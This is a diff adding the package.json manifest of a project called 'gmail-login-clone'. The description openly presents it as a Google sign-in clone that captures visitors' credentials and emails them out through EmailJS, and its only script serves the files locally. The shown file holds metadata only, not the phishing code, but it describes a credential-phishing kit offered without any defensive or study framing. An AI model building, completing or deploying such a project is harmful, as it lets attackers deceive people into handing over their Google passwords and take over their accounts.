@@ -1,0 +1,9 @@
+{
+  "name": "gmail-login-clone",
+  "version": "1.0.0",
+  "description": "Google sign-in clone that captures credentials and emails them via EmailJS",
+  "private": true,
+  "scripts": {
+    "dev": "npx serve ."
+  }
+}
